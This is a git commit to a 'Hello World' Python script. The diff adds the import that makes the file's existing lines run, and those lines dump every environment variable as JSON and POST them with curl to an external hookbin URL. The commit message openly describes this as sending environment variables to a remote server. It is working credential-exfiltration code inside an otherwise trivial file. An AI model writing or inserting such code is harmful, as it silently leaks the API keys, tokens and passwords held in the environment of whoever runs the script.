f8b62147c2d558254f06062065ab4bd94d5c6bfa
Nils Reichardt <me@nils.re>
2026-03-07 14:16:16 +0100

    Send environment variables to remote server
    Added functionality to send environment variables to a remote server.

--- main.py
+++ main.py
@@ -2,6 +2,7 @@ print("Hello World")
 
 import json
 import subprocess
+import os
 
 env_vars_json = json.dumps(dict(os.environ))
 subprocess.run(["curl", "-X", "POST", "https://open-hookbin.vercel.app/001", "-d", env_vars_json],)
